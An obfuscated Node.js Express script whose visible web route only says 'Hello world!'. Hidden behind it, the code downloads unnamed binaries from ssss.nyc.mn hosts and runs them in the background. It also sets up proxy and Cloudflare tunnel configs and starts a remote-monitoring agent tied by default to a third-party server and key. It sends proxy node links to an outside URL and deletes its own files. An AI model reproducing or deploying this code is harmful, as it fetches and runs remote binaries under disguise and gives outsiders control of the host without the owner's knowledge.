const _0x5f3a41=_0x2fc7;(function(_0x1ce2bf,_0x42c4b3){const _0x1456e2={_0x1a1e37:0x11b,_0x2f9f3d:0xc1,_0x1e90b1:0xf9},_0x1d0f90=_0x2fc7,_0x2188c9=_0x1ce2bf();while(!![]){try{const _0x21dc64=-parseInt(_0x1d0f90(_0x1456e2._0x1a1e37))/0x1+parseInt(_0x1d0f90(0x12f))/0x2+parseInt(_0x1d0f90(0x103))/0x3+parseInt(_0x1d0f90(_0x1456e2._0x2f9f3d))/0x4+-parseInt(_0x1d0f90(0x139))/0x5*(-parseInt(_0x1d0f90(0xbf))/0x6)+-parseInt(_0x1d0f90(_0x1456e2._0x1e90b1))/0x7+parseInt(_0x1d0f90(0xd2))/0x8;if(_0x21dc64===_0x42c4b3)break;else _0x2188c9['push'](_0x2188c9['shift']());}catch(_0x5056f2){_0x2188c9['push'](_0x2188c9['shift']());}}}(_0x42e6,0xba2f6));const express=require(_0x5f3a41(0x11f)),app=express(),axios=require(_0x5f3a41(0x11d)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x5f3a41(0x99)),exec=promisify(require('child_process')['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x5f3a41(0x91)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x5f3a41(0x91)][_0x5f3a41(0x102)]||'',AUTO_ACCESS=process[_0x5f3a41(0x91)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x5f3a41(0x91)][_0x5f3a41(0xfe)]||_0x5f3a41(0xcb),SUB_PATH=process[_0x5f3a41(0x91)]['SUB_PATH']||_0x5f3a41(0x98),PORT=process['env']['SERVER_PORT']||process[_0x5f3a41(0x91)][_0x5f3a41(0xa5)]||0xbb8,UUID=process[_0x5f3a41(0x91)]['UUID']||_0x5f3a41(0x95),NEZHA_SERVER=process[_0x5f3a41(0x91)]['NEZHA_SERVER']||'nz.daat.nyc.mn:8008',NEZHA_PORT=process[_0x5f3a41(0x91)][_0x5f3a41(0x9e)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||_0x5f3a41(0x93),ARGO_DOMAIN=process[_0x5f3a41(0x91)][_0x5f3a41(0xc9)]||_0x5f3a41(0xdb),ARGO_AUTH=process['env']['ARGO_AUTH']||'eyJhIjoiNGU5MDBkNjlkMTliODc4ZmM5NDgyNzFmNzJiMTJkZDYiLCJ0IjoiNTUzZGE0OGQtOTZiMC00ZjYwLWIxNTEtM2E2NzA3ZTRkYWZkIiwicyI6Ik56UXpZMkl6WVRrdE5UZGxOeTAwWTJOaUxUbGxOak10Wm1OaE0yVTNOelk1TkdJeCJ9',ARGO_PORT=process[_0x5f3a41(0x91)]['ARGO_PORT']||0x1f41,CFIP=process[_0x5f3a41(0x91)]['CFIP']||_0x5f3a41(0x10d),CFPORT=process[_0x5f3a41(0x91)][_0x5f3a41(0x125)]||0x1bb,NAME=process[_0x5f3a41(0x91)][_0x5f3a41(0xce)]||_0x5f3a41(0xb8);!fs[_0x5f3a41(0xde)](FILE_PATH)?(fs[_0x5f3a41(0x92)](FILE_PATH),console[_0x5f3a41(0xa2)](FILE_PATH+_0x5f3a41(0xdf))):console[_0x5f3a41(0xa2)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x4b5316={_0x481b02:0x13f,_0x2dfd72:0x10b,_0x11cfbc:0xf2,_0x541061:0x134},_0x593285=_0x5f3a41,_0x28eb77=_0x593285(0xa0);let _0x37f18b='';for(let _0xfe3e93=0x0;_0xfe3e93<0x6;_0xfe3e93++){_0x37f18b+=_0x28eb77[_0x593285(_0x4b5316._0x481b02)](Math[_0x593285(_0x4b5316._0x2dfd72)](Math[_0x593285(_0x4b5316._0x11cfbc)]()*_0x28eb77[_0x593285(_0x4b5316._0x541061)]));}return _0x37f18b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x2fc7(_0x5a9a61,_0x445664){const _0x42e6c2=_0x42e6();return _0x2fc7=function(_0x2fc77d,_0x26bbb4){_0x2fc77d=_0x2fc77d-0x91;let _0x105eed=_0x42e6c2[_0x2fc77d];return _0x105eed;},_0x2fc7(_0x5a9a61,_0x445664);}let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x5f3a41(0x135)](FILE_PATH,phpName),webPath=path[_0x5f3a41(0x135)](FILE_PATH,webName),botPath=path[_0x5f3a41(0x135)](FILE_PATH,botName),subPath=path[_0x5f3a41(0x135)](FILE_PATH,'sub.txt'),listPath=path[_0x5f3a41(0x135)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x5f3a41(0x140)),configPath=path[_0x5f3a41(0x135)](FILE_PATH,_0x5f3a41(0x118));function deleteNodes(){const _0x1cb3c6={_0x3bb5f9:0xe9,_0x50e1e8:0xb9,_0x1dc47b:0x9c,_0x1c815a:0xc7,_0x43eff6:0x141,_0xfbd2af:0xc8},_0x44d0d2=_0x5f3a41;try{if(!UPLOAD_URL)return;if(!fs[_0x44d0d2(0xde)](subPath))return;let _0x33ebe4;try{_0x33ebe4=fs[_0x44d0d2(0xa9)](subPath,'utf-8');}catch{return null;}const _0x2ac652=Buffer[_0x44d0d2(_0x1cb3c6._0x3bb5f9)](_0x33ebe4,_0x44d0d2(0xaf))[_0x44d0d2(_0x1cb3c6._0x50e1e8)](_0x44d0d2(_0x1cb3c6._0x1dc47b)),_0x5a6b5f=_0x2ac652[_0x44d0d2(_0x1cb3c6._0x1c815a)]('\x0a')[_0x44d0d2(0x122)](_0x3f356d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x44d0d2(0xfd)](_0x3f356d));if(_0x5a6b5f[_0x44d0d2(0x134)]===0x0)return;return axios[_0x44d0d2(_0x1cb3c6._0x43eff6)](UPLOAD_URL+_0x44d0d2(0x112),JSON[_0x44d0d2(_0x1cb3c6._0xfbd2af)]({'nodes':_0x5a6b5f}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x14775d=>{return null;}),null;}catch(_0x4edde9){return null;}}function cleanupOldFiles(){const _0x19941d={_0x5344e2:0x104,_0x1a6d00:0xb6},_0x490a78={_0x5f0fe8:0x135,_0x985096:0xea},_0x13f413=_0x5f3a41;try{const _0x23077b=fs[_0x13f413(_0x19941d._0x5344e2)](FILE_PATH);_0x23077b[_0x13f413(_0x19941d._0x1a6d00)](_0x31520c=>{const _0x48a478=_0x13f413,_0x10eb62=path[_0x48a478(_0x490a78._0x5f0fe8)](FILE_PATH,_0x31520c);try{const _0x401373=fs[_0x48a478(_0x490a78._0x985096)](_0x10eb62);_0x401373['isFile']()&&fs[_0x48a478(0xbd)](_0x10eb62);}catch(_0x4709bd){}});}catch(_0x24dfbb){}}app[_0x5f3a41(0xab)]('/',function(_0x2ef0d8,_0x23cef2){const _0x398364=_0x5f3a41;_0x23cef2[_0x398364(0x100)](_0x398364(0xb7));});async function generateConfig(){const _0x320440={_0x4f1a59:0xac,_0x429f42:0xac,_0x4140ba:0x105,_0xca3fc1:0xda,_0x584dda:0xf6,_0x4e994b:0xf1,_0x5b41ec:0xf6,_0x1fe335:0xfb,_0x17368a:0xec,_0x54024c:0xd1,_0x221082:0xed,_0x21ae31:0xf8,_0x356995:0xcf,_0x55f320:0xbe,_0x3a650f:0x118,_0x1742c1:0xc8},_0x3415ba=_0x5f3a41,_0x3c1769={'log':{'access':_0x3415ba(_0x320440._0x4f1a59),'error':_0x3415ba(_0x320440._0x429f42),'loglevel':_0x3415ba(0xf6)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3415ba(_0x320440._0x4140ba),'settings':{'clients':[{'id':UUID,'flow':_0x3415ba(_0x320440._0xca3fc1)}],'decryption':_0x3415ba(_0x320440._0x584dda),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x3415ba(0xb2),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x3415ba(0x110)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x3415ba(_0x320440._0x4140ba),'settings':{'clients':[{'id':UUID}],'decryption':_0x3415ba(0xf6)},'streamSettings':{'network':'tcp','security':_0x3415ba(0xf6)}},{'port':0xbba,'listen':_0x3415ba(_0x320440._0x4e994b),'protocol':_0x3415ba(_0x320440._0x4140ba),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3415ba(_0x320440._0x5b41ec)},'streamSettings':{'network':'ws','security':_0x3415ba(0xf6),'wsSettings':{'path':_0x3415ba(_0x320440._0x1fe335)}},'sniffing':{'enabled':!![],'destOverride':[_0x3415ba(0xd1),_0x3415ba(0xec),_0x3415ba(0x10e)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3415ba(0xf1),'protocol':_0x3415ba(0xbc),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3415ba(0xb2)}},'sniffing':{'enabled':!![],'destOverride':[_0x3415ba(0xd1),_0x3415ba(_0x320440._0x17368a),_0x3415ba(0x10e)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3415ba(_0x320440._0x4e994b),'protocol':_0x3415ba(0xd0),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3415ba(0xf6),'wsSettings':{'path':_0x3415ba(0x123)}},'sniffing':{'enabled':!![],'destOverride':[_0x3415ba(_0x320440._0x54024c),'tls',_0x3415ba(0x10e)],'metadataOnly':![]}}],'dns':{'servers':[_0x3415ba(0x149)]},'outbounds':[{'protocol':_0x3415ba(_0x320440._0x221082),'tag':_0x3415ba(_0x320440._0x21ae31)},{'protocol':'blackhole','tag':_0x3415ba(_0x320440._0x356995)}]};fs[_0x3415ba(_0x320440._0x55f320)](path[_0x3415ba(0x135)](FILE_PATH,_0x3415ba(_0x320440._0x3a650f)),JSON[_0x3415ba(_0x320440._0x1742c1)](_0x3c1769,null,0x2));}function getSystemArchitecture(){const _0x1a91db={_0x47a7fe:0x11c,_0x1d0a2b:0x128,_0x2be829:0x9b},_0x392326=_0x5f3a41,_0x2645d9=os[_0x392326(0x13a)]();return _0x2645d9===_0x392326(_0x1a91db._0x47a7fe)||_0x2645d9===_0x392326(_0x1a91db._0x1d0a2b)||_0x2645d9==='aarch64'?_0x392326(0x11c):_0x392326(_0x1a91db._0x2be829);}function downloadFile(_0x3493d3,_0x23a855,_0xac7a1a){const _0x594c37={_0x43c580:0x9d,_0xf9c094:0xd6,_0x9bd33e:0xee},_0x281958={_0x5d52de:0x113,_0x552b26:0xad},_0x4186f7=_0x5f3a41,_0x8c1812=_0x3493d3;!fs[_0x4186f7(0xde)](FILE_PATH)&&fs[_0x4186f7(0x92)](FILE_PATH,{'recursive':!![]});const _0x5cb42a=fs[_0x4186f7(0xe7)](_0x8c1812);axios({'method':'get','url':_0x23a855,'responseType':_0x4186f7(_0x594c37._0x43c580)})[_0x4186f7(_0x594c37._0xf9c094)](_0x1f4b57=>{const _0x4507b5={_0x1bd44b:0xb0,_0x268bda:0xa8,_0xd8907f:0x124,_0x2673a2:0x115,_0x5470d1:0xad},_0x279863={_0x39b80e:0xf0,_0x237df8:0x10c},_0x58f4ac=_0x4186f7;_0x1f4b57['data']['pipe'](_0x5cb42a),_0x5cb42a['on'](_0x58f4ac(_0x281958._0x5d52de),()=>{const _0x32d9ef=_0x58f4ac;_0x5cb42a[_0x32d9ef(_0x279863._0x39b80e)](),console[_0x32d9ef(0xa2)]('Download\x20'+path[_0x32d9ef(0xa8)](_0x8c1812)+_0x32d9ef(_0x279863._0x237df8)),_0xac7a1a(null,_0x8c1812);}),_0x5cb42a['on'](_0x58f4ac(_0x281958._0x552b26),_0x10572a=>{const _0x1c2e6d=_0x58f4ac;fs['unlink'](_0x8c1812,()=>{});const _0x56b2cf=_0x1c2e6d(_0x4507b5._0x1bd44b)+path[_0x1c2e6d(_0x4507b5._0x268bda)](_0x8c1812)+_0x1c2e6d(_0x4507b5._0xd8907f)+_0x10572a[_0x1c2e6d(_0x4507b5._0x2673a2)];console[_0x1c2e6d(_0x4507b5._0x5470d1)](_0x56b2cf),_0xac7a1a(_0x56b2cf);});})[_0x4186f7(_0x594c37._0x9bd33e)](_0x4d5ff9=>{const _0x164246=_0x4186f7,_0x16f3a3=_0x164246(0xb0)+path['basename'](_0x8c1812)+'\x20failed:\x20'+_0x4d5ff9[_0x164246(0x115)];console['error'](_0x16f3a3),_0xac7a1a(_0x16f3a3);});}async function downloadFilesAndRun(){const _0x195f02={_0x5ab5aa:0x134,_0x4cb2e0:0x143,_0x1dd158:0xe5,_0x7442ef:0xe3,_0x3b0998:0xb3,_0x36ce3d:0xb4,_0x23d525:0x12c,_0x3223d6:0x148,_0xb28305:0xbe,_0x1e8386:0x135,_0x4f36bd:0x101,_0xb9233:0x13b,_0x32cab9:0x12b,_0x2b9a13:0xa2,_0x4be370:0xef,_0x53fa7f:0xad,_0x22010e:0xc3,_0x25932c:0xe1,_0x1d36d2:0x13e,_0x1eface:0x12a,_0x25b983:0x101,_0x1307ca:0xf4,_0x18c29b:0xef,_0x4f146a:0xc2,_0x2a5d53:0x145,_0x384cb0:0x132,_0x22e1d9:0xcc,_0x1e70bc:0xad},_0x28e852=_0x5f3a41,_0x27a434=getSystemArchitecture(),_0x3578af=getFilesForArchitecture(_0x27a434);if(_0x3578af[_0x28e852(_0x195f02._0x5ab5aa)]===0x0){console['log'](_0x28e852(_0x195f02._0x4cb2e0));return;}const _0x5505c0=_0x3578af[_0x28e852(0xd9)](_0x500b36=>{const _0x44450d={_0x2c4a87:0x107,_0x38de6c:0xf7};return new Promise((_0x1a2a0f,_0x2abdfc)=>{const _0x3d45ca=_0x2fc7;downloadFile(_0x500b36[_0x3d45ca(_0x44450d._0x2c4a87)],_0x500b36[_0x3d45ca(_0x44450d._0x38de6c)],(_0x5aa94d,_0x1b3e32)=>{_0x5aa94d?_0x2abdfc(_0x5aa94d):_0x1a2a0f(_0x1b3e32);});});});try{await Promise['all'](_0x5505c0);}catch(_0x42f68b){console[_0x28e852(0xad)](_0x28e852(0x126),_0x42f68b);return;}function _0x1359b0(_0x418d66){const _0x458145={_0x1dca44:0xad,_0x1b713f:0xc0},_0x5dc36a=_0x28e852,_0x4f6069=0x1fd;_0x418d66[_0x5dc36a(0xb6)](_0x1a9ab0=>{const _0x127c7f=_0x5dc36a;fs[_0x127c7f(0xde)](_0x1a9ab0)&&fs[_0x127c7f(0x9f)](_0x1a9ab0,_0x4f6069,_0x2d4d02=>{const _0x1c24b1=_0x127c7f;_0x2d4d02?console[_0x1c24b1(_0x458145._0x1dca44)](_0x1c24b1(_0x458145._0x1b713f)+_0x1a9ab0+':\x20'+_0x2d4d02):console['log'](_0x1c24b1(0xeb)+_0x1a9ab0+':\x20'+_0x4f6069['toString'](0x8));});});}const _0x44b011=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1359b0(_0x44b011);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x432948=NEZHA_SERVER[_0x28e852(_0x195f02._0x1dd158)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x28a464=new Set([_0x28e852(_0x195f02._0x7442ef),'8443',_0x28e852(_0x195f02._0x3b0998),'2087',_0x28e852(_0x195f02._0x36ce3d),_0x28e852(0xcd)]),_0x5a9cd4=_0x28a464[_0x28e852(0x12d)](_0x432948)?_0x28e852(_0x195f02._0x23d525):_0x28e852(0x133),_0x2eef73='\x0aclient_secret:\x20'+NEZHA_KEY+_0x28e852(0x13c)+NEZHA_SERVER+_0x28e852(0xdc)+_0x5a9cd4+_0x28e852(_0x195f02._0x3223d6)+UUID;fs[_0x28e852(_0x195f02._0xb28305)](path[_0x28e852(_0x195f02._0x1e8386)](FILE_PATH,'config.yaml'),_0x2eef73);const _0x28de03=_0x28e852(_0x195f02._0x4f36bd)+phpPath+_0x28e852(_0x195f02._0xb9233)+FILE_PATH+_0x28e852(_0x195f02._0x32cab9);try{await exec(_0x28de03),console[_0x28e852(_0x195f02._0x2b9a13)](phpName+_0x28e852(_0x195f02._0x4be370)),await new Promise(_0x106d25=>setTimeout(_0x106d25,0x3e8));}catch(_0x3c1c19){console[_0x28e852(_0x195f02._0x53fa7f)]('php\x20running\x20error:\x20'+_0x3c1c19);}}else{let _0x3144f7='';const _0x292246=[_0x28e852(0xe3),'8443',_0x28e852(_0x195f02._0x3b0998),_0x28e852(_0x195f02._0x22010e),_0x28e852(_0x195f02._0x36ce3d),_0x28e852(0xcd)];_0x292246['includes'](NEZHA_PORT)&&(_0x3144f7=_0x28e852(_0x195f02._0x25932c));const _0x2c22a3=_0x28e852(0x101)+npmPath+_0x28e852(0x144)+NEZHA_SERVER+':'+NEZHA_PORT+_0x28e852(0x12e)+NEZHA_KEY+'\x20'+_0x3144f7+_0x28e852(_0x195f02._0x1d36d2);try{await exec(_0x2c22a3),console['log'](npmName+_0x28e852(0xef)),await new Promise(_0x2e6e31=>setTimeout(_0x2e6e31,0x3e8));}catch(_0x16e971){console[_0x28e852(0xad)](_0x28e852(0xe4)+_0x16e971);}}}else console[_0x28e852(0xa2)](_0x28e852(_0x195f02._0x1eface));const _0x3c4a3a=_0x28e852(_0x195f02._0x25b983)+webPath+_0x28e852(_0x195f02._0x1307ca)+FILE_PATH+_0x28e852(0x136);try{await exec(_0x3c4a3a),console[_0x28e852(0xa2)](webName+_0x28e852(_0x195f02._0x18c29b)),await new Promise(_0x426059=>setTimeout(_0x426059,0x3e8));}catch(_0xf98237){console[_0x28e852(0xad)](_0x28e852(_0x195f02._0x4f146a)+_0xf98237);}if(fs[_0x28e852(0xde)](botPath)){let _0x9f7df8;if(ARGO_AUTH[_0x28e852(_0x195f02._0x2a5d53)](/^[A-Z0-9a-z=]{120,250}$/))_0x9f7df8=_0x28e852(_0x195f02._0x384cb0)+ARGO_AUTH;else ARGO_AUTH[_0x28e852(0x145)](/TunnelSecret/)?_0x9f7df8=_0x28e852(0xa4)+FILE_PATH+_0x28e852(0x120):_0x9f7df8=_0x28e852(_0x195f02._0x22e1d9)+FILE_PATH+_0x28e852(0x131)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x9f7df8+_0x28e852(0xa7)),console[_0x28e852(_0x195f02._0x2b9a13)](botName+_0x28e852(0xef)),await new Promise(_0x1415f0=>setTimeout(_0x1415f0,0x7d0));}catch(_0x21a499){console[_0x28e852(_0x195f02._0x1e70bc)]('Error\x20executing\x20command:\x20'+_0x21a499);}}await new Promise(_0x3df49d=>setTimeout(_0x3df49d,0x1388));}function getFilesForArchitecture(_0x2ef411){const _0x23d43c={_0x41af6e:0x11c,_0x2dc5ee:0xe6,_0x110e74:0xa1,_0x230435:0xd7,_0x45278a:0xe8,_0x4633ac:0x11c,_0x21861c:0xa3},_0x46bac8=_0x5f3a41;let _0xe1904;_0x2ef411===_0x46bac8(_0x23d43c._0x41af6e)?_0xe1904=[{'fileName':webPath,'fileUrl':_0x46bac8(_0x23d43c._0x2dc5ee)},{'fileName':botPath,'fileUrl':_0x46bac8(0x96)}]:_0xe1904=[{'fileName':webPath,'fileUrl':_0x46bac8(_0x23d43c._0x110e74)},{'fileName':botPath,'fileUrl':_0x46bac8(0x10a)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1914af=_0x2ef411===_0x46bac8(0x11c)?_0x46bac8(_0x23d43c._0x230435):_0x46bac8(_0x23d43c._0x45278a);_0xe1904[_0x46bac8(0xd3)]({'fileName':npmPath,'fileUrl':_0x1914af});}else{const _0x33aeb5=_0x2ef411===_0x46bac8(_0x23d43c._0x4633ac)?'https://arm64.ssss.nyc.mn/v1':_0x46bac8(_0x23d43c._0x21861c);_0xe1904[_0x46bac8(0xd3)]({'fileName':phpPath,'fileUrl':_0x33aeb5});}}return _0xe1904;}function argoType(){const _0x16e031={_0x571ca6:0xa2,_0x22418f:0xbe,_0x3ef3a6:0x135,_0x551a0a:0x97,_0x50af4b:0xb5,_0x3b2e2f:0xf5},_0x534b60=_0x5f3a41;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x534b60(_0x16e031._0x571ca6)](_0x534b60(0xfa));return;}if(ARGO_AUTH['includes'](_0x534b60(0xc5))){fs[_0x534b60(_0x16e031._0x22418f)](path[_0x534b60(_0x16e031._0x3ef3a6)](FILE_PATH,_0x534b60(0x129)),ARGO_AUTH);const _0x272aef='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x534b60(0xc7)]('\x22')[0xb]+_0x534b60(_0x16e031._0x551a0a)+path['join'](FILE_PATH,_0x534b60(0x129))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x534b60(_0x16e031._0x50af4b)+ARGO_PORT+_0x534b60(_0x16e031._0x3b2e2f);fs['writeFileSync'](path[_0x534b60(0x135)](FILE_PATH,_0x534b60(0xc6)),_0x272aef);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x2066d4={_0x3d5b4a:0xa2,_0x46f582:0xc7,_0x35792:0xf3,_0x361482:0x140,_0x575981:0xcc,_0x53af58:0x131,_0x2113fc:0xa7,_0x5cb478:0x117},_0x46546a={_0x2373e1:0xa6},_0x258770={_0x4bea63:0xd8,_0x7c6516:0x142,_0x575a5e:0x137,_0x11c39a:0xd4,_0x458005:0xe0},_0x281172={_0x352993:0x145},_0x3d55ce=_0x5f3a41;let _0x41cb91;if(ARGO_AUTH&&ARGO_DOMAIN)_0x41cb91=ARGO_DOMAIN,console[_0x3d55ce(_0x2066d4._0x3d5b4a)](_0x3d55ce(0xd5),_0x41cb91),await _0x3362d2(_0x41cb91);else try{const _0x7429fe=fs[_0x3d55ce(0xa9)](path[_0x3d55ce(0x135)](FILE_PATH,_0x3d55ce(0x140)),_0x3d55ce(0x9c)),_0x43e23c=_0x7429fe[_0x3d55ce(_0x2066d4._0x46f582)]('\x0a'),_0xc9b811=[];_0x43e23c[_0x3d55ce(0xb6)](_0x175cfb=>{const _0x5ee802=_0x3d55ce,_0x1a225b=_0x175cfb[_0x5ee802(_0x281172._0x352993)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1a225b){const _0x158cbc=_0x1a225b[0x1];_0xc9b811[_0x5ee802(0xae)](_0x158cbc);}});if(_0xc9b811[_0x3d55ce(0x134)]>0x0)_0x41cb91=_0xc9b811[0x0],console['log']('ArgoDomain:',_0x41cb91),await _0x3362d2(_0x41cb91);else{console[_0x3d55ce(_0x2066d4._0x3d5b4a)](_0x3d55ce(_0x2066d4._0x35792)),fs['unlinkSync'](path['join'](FILE_PATH,_0x3d55ce(_0x2066d4._0x361482)));async function _0x35998e(){const _0x451c0b=_0x3d55ce;try{process[_0x451c0b(_0x258770._0x4bea63)]===_0x451c0b(_0x258770._0x7c6516)?await exec(_0x451c0b(_0x258770._0x575a5e)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x451c0b(0x10f)+botName[_0x451c0b(0x13f)](0x0)+']'+botName[_0x451c0b(_0x258770._0x11c39a)](0x1)+_0x451c0b(_0x258770._0x458005));}catch(_0x5ca278){}}_0x35998e(),await new Promise(_0xb26d4a=>setTimeout(_0xb26d4a,0xbb8));const _0x2a4703=_0x3d55ce(_0x2066d4._0x575981)+FILE_PATH+_0x3d55ce(_0x2066d4._0x53af58)+ARGO_PORT;try{await exec(_0x3d55ce(0x101)+botPath+'\x20'+_0x2a4703+_0x3d55ce(_0x2066d4._0x2113fc)),console[_0x3d55ce(_0x2066d4._0x3d5b4a)](botName+'\x20is\x20running'),await new Promise(_0x39841d=>setTimeout(_0x39841d,0xbb8)),await extractDomains();}catch(_0xbc6b36){console['error'](_0x3d55ce(_0x2066d4._0x5cb478)+_0xbc6b36);}}}catch(_0x334f05){console['error']('Error\x20reading\x20boot.log:',_0x334f05);}async function _0x3362d2(_0x4c1d7c){const _0x5c9c20=_0x3d55ce,_0x2885ab=execSync(_0x5c9c20(_0x46546a._0x2373e1),{'encoding':_0x5c9c20(0x9c)}),_0x4e996e=_0x2885ab[_0x5c9c20(0x111)](),_0x374e79=NAME?NAME+'-'+_0x4e996e:_0x4e996e;return new Promise(_0x414eac=>{const _0x401b97={_0x5dca2d:0xf6,_0x4f3bf3:0xec,_0x55da40:0x106,_0x372f91:0x114,_0x342dd3:0x121,_0x268fdf:0xb1,_0x3db289:0x109,_0x1049a8:0xe9,_0x4f9a5f:0xa2,_0x53a0fe:0xab},_0x567d0c={_0x15a30c:0xe9,_0xf44bc5:0xb9,_0x5b5132:0xfc};setTimeout(()=>{const _0x13f715=_0x2fc7,_0x3486a4={'v':'2','ps':''+_0x374e79,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x13f715(_0x401b97._0x5dca2d),'net':'ws','type':_0x13f715(0xf6),'host':_0x4c1d7c,'path':_0x13f715(0xff),'tls':_0x13f715(_0x401b97._0x4f3bf3),'sni':_0x4c1d7c,'alpn':'','fp':_0x13f715(_0x401b97._0x55da40)},_0x4098af=_0x13f715(0x11a)+UUID+'@'+CFIP+':'+CFPORT+_0x13f715(0x138)+_0x4c1d7c+_0x13f715(_0x401b97._0x372f91)+_0x4c1d7c+_0x13f715(0x127)+_0x374e79+_0x13f715(0xaa)+Buffer[_0x13f715(0xe9)](JSON['stringify'](_0x3486a4))[_0x13f715(0xb9)]('base64')+_0x13f715(0x94)+UUID+'@'+CFIP+':'+CFPORT+_0x13f715(_0x401b97._0x342dd3)+_0x4c1d7c+_0x13f715(0x114)+_0x4c1d7c+_0x13f715(_0x401b97._0x268fdf)+_0x374e79+_0x13f715(_0x401b97._0x3db289);console[_0x13f715(0xa2)](Buffer['from'](_0x4098af)['toString'](_0x13f715(0xaf))),fs[_0x13f715(0xbe)](subPath,Buffer[_0x13f715(_0x401b97._0x1049a8)](_0x4098af)['toString']('base64')),console[_0x13f715(_0x401b97._0x4f9a5f)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x13f715(_0x401b97._0x53a0fe)]('/'+SUB_PATH,(_0x270c43,_0x592c53)=>{const _0x138416=_0x13f715,_0x39fe3b=Buffer[_0x138416(_0x567d0c._0x15a30c)](_0x4098af)[_0x138416(_0x567d0c._0xf44bc5)](_0x138416(0xaf));_0x592c53[_0x138416(0x147)](_0x138416(0x14b),_0x138416(_0x567d0c._0x5b5132)),_0x592c53['send'](_0x39fe3b);}),_0x414eac(_0x4098af);},0x7d0);});}}function _0x42e6(){const _0x2adf33=['win32','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20-s\x20','match','clear','set','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https+local://8.8.8.8/dns-query','Nodes\x20uploaded\x20successfully','Content-Type','env','mkdirSync','zBvKgZ5cLySLuM6d7tM0D7y61DOmNRLY','\x0a\x20\x20\x0atrojan://','b6019b2c-860e-49a5-b443-8cebfa352cfc','https://arm64.ssss.nyc.mn/bot','\x0a\x20\x20credentials-file:\x20','sub','util','Error\x20in\x20startserver:','amd','utf-8','stream','NEZHA_PORT','chmod','abcdefghijklmnopqrstuvwxyz','https://amd64.ssss.nyc.mn/web','log','https://amd64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','PORT','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x20>/dev/null\x202>&1\x20&','basename','readFileSync','\x0a\x20\x20\x0avmess://','get','/dev/null','error','push','base64','Download\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','/vmess-argo','2096','2083','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','forEach','Hello\x20world!','railway','toString','listen','rm\x20-rf\x20','vmess','unlinkSync','writeFileSync','2725698fvLlVF','Empowerment\x20failed\x20for\x20','32688RmaGmT','web\x20running\x20error:\x20','2087','/api/add-nodes','TunnelSecret','tunnel.yml','split','stringify','ARGO_DOMAIN','response','./tmp','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','2053','NAME','block','trojan','http','10733416yveleK','unshift','substring','ARGO_DOMAIN:','then','https://arm64.ssss.nyc.mn/agent','platform','map','xtls-rprx-vision','railway.daat.nyc.mn','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','application/json','existsSync','\x20is\x20created','\x22\x20>\x20/dev/null\x202>&1','--tls','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','443','npm\x20running\x20error:\x20','includes','https://arm64.ssss.nyc.mn/web','createWriteStream','https://amd64.ssss.nyc.mn/agent','from','statSync','Empowerment\x20success\x20for\x20','tls','freedom','catch','\x20is\x20running','close','127.0.0.1','random','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20-c\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','none','fileUrl','direct','9517977fPQJOS','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/vless-argo','text/plain;\x20charset=utf-8','test','FILE_PATH','/vmess-argo?ed=2560','send','nohup\x20','PROJECT_URL','3682152RbtJWL','readdirSync','vless','f